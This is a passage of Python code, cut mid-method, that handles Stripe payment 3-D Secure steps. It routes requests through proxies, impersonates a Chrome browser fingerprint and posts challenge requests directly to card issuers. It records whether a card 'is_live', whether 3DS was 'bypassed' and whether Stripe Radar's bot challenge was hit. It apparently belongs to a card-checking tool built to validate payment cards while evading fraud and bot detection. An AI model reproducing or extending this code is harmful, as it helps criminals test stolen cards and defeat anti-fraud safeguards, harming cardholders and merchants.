        if not next_action or not isinstance(next_action, dict) or not client_secret:
            return result

        pi_id = pi.get("id") or (client_secret.split("_secret_")[0] if "_secret_" in client_secret else None)

        proxies = None
        if proxy_data:
            auth = f"{proxy_data['username']}:{proxy_data['password']}@" if "username" in proxy_data else ""
            raw_srv = proxy_data["server"]
            scheme = "http"
            for prefix in ("http://", "https://", "socks5://", "socks5h://", "socks4://"):
                if raw_srv.startswith(prefix):
                    scheme = prefix.rstrip(":/")
                    raw_srv = raw_srv[len(prefix):]
                    break
            proxies = {"http": f"{scheme}://{auth}{raw_srv}", "https": f"{scheme}://{auth}{raw_srv}"}

        try:
            prof = profile or {"impersonate": "chrome131"}
            async with ChromeSession(
                impersonate=prof.get("impersonate", "chrome131"),
                proxies=proxies,
                timeout=30,
            ) as sess:
                act_type = next_action.get("type")
                sdk_block = next_action.get("use_stripe_sdk") or {}
                if not isinstance(sdk_block, dict):
                    sdk_block = {}
                outcome = None

                sdk_type = sdk_block.get("type") or act_type
                # Guard: only fire direct CReq path for explicit challenge types.
                # Fingerprint blobs (stripe_3ds2_fingerprint, use_stripe_sdk) sometimes carry
                # leftover acs_url keys — routing them here skips method and ACS returns C.
                is_explicit_challenge = sdk_type in ("stripe_3ds2_challenge", "three_ds_2_challenge")
                if is_explicit_challenge and (sdk_block.get("acs_url") or sdk_block.get("creq")):
                    acs_url = sdk_block.get("acs_url") or (sdk_block.get("three_ds_2_challenge") or {}).get("acs_url")
                    creq = sdk_block.get("creq") or (sdk_block.get("three_ds_2_challenge") or {}).get("creq")
                    sdata = sdk_block.get("three_ds_session_data") or sdk_block.get("threeDSSessionData") or ""
                    if acs_url and creq:
                        creq_out = await cls._post_creq(sess, acs_url, creq, sdata, profile)
                        if creq_out and creq_out.get("challenge_required"):
                            outcome = creq_out
                        else:
                            outcome = await cls._check_pi_status(sess, pi_id, client_secret, pk_key, profile)

                if not outcome:
                    if act_type in ("use_stripe_sdk", "stripe_3ds2_fingerprint", "stripe_3ds2_challenge") or "use_stripe_sdk" in next_action:
                        outcome = await cls._resolve_3ds2_sdk(sess, next_action, client_secret, pk_key, profile, depth=0)
                    elif act_type == "redirect_to_url":
                        redirect_url = (next_action.get("redirect_to_url") or {}).get("url")
                        outcome = await cls._resolve_redirect_url(sess, redirect_url, pi_id, client_secret, pk_key, profile, depth=0)

                if outcome and outcome.get("success"):
                    result["success"] = True
                    result["is_live"] = True
                    result["3ds_bypassed"] = True
                    result["3ds_type"] = act_type or "3DS"
                    result["decline_code"] = None
                    result["error"] = None
                    if outcome.get("raw_response"):
                        result["raw_response"] = outcome["raw_response"]
                elif outcome and outcome.get("status") == "declined":
                    result["success"] = False
                    result["is_live"] = True
                    result["decline_code"] = outcome.get("decline_code") or "card_declined"
                    result["error"] = outcome.get("error") or "Declined after WAF verification"
                    if outcome.get("raw_response"):
                        result["raw_response"] = outcome["raw_response"]
                elif outcome and outcome.get("radar_challenge"):
                    result["is_radar_challenge"] = True
                    result["3ds_attempted"] = False
                    result["decline_code"] = "radar_bot_challenge"
                    result["error"] = "Stripe Radar Bot Challenge (hCaptcha Enterprise)"
                elif outcome:
                    result["3ds_attempted"] = True
                    result["3ds_type"] = act_type or "3DS"
                    result["3ds_status"] = outcome.get("status", "failed")
                    if outcome.get("challenge_required"):
                        result["challenge_required"] = True
                        result["challenge_url"] = outcome.get("challenge_url")
        except Exception as ex:
            result["3ds_error"] = str(ex)[:160]

        return result
